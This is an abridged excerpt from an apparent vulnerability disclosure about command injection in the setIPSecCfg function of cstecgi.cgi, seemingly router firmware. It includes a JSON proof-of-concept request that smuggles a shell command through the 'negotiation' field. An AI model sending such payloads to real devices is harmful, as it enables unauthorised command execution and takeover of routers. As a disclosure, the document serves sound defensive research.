...
The vulnerability is located in the function `sub_410C14` within `cstecgi.cgi`, also known as `setIPSecCfg`.

![](Pasted%20image%2020231130172659.png)
...
therefore , by controlling parameter among  `enable,auto,negotiation...`(more in this function) , we can finally make an arbitrary command execution
...
{"enable":"1","negotiation":"`id > /1.txt;`","topicurl":"setIPSecCfg","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231130172952.png)